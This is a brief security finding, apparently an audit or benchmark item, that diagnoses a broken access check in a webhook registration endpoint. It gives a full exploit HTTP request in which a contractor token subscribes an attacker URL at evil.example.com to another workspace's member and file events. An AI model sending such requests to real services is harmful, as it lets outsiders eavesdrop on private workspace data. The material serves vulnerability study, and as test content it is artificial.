diagnosis: The developer webhook registration endpoint validates the URL and subscribed events array using class-validator, but saves the webhook callback URL for the workspaceId provided in the DTO without verifying that req.user is an administrator or member of that workspace, allowing eavesdropping on workspace events.
exploit_request:
POST /api/developer/webhooks HTTP/1.1
Host: api.workhub.io:7004
Authorization: Bearer <contractor_jwt>
Content-Type: application/json

{"workspaceId": "e2a1b903-8812-4cf0-8012-ba912019a123", "callbackUrl": "https://evil.example.com/eavesdrop", "subscribedEvents": ["member.invited", "file.uploaded"]}
